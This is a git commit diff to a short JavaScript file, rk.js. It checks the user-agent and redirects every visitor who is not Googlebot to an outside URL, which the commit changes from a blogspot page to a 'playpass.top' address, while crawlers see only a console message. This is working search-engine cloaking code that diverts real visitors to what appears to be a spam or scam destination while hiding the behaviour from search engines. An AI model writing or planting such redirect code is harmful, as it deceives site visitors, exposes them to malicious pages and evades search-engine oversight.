547f0b7842cc018d7b09915f9661ee7a0adac0b3
nehtasc <ruhul.meheta015@gmail.com>
2026-09-11 03:21:07 +0600

    Update rk.js

--- rk.js
+++ rk.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://axnimestx.blogspot.com/2026/07/videos.html";
+  window.location.href = "https://playpass.top/sr/pok";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
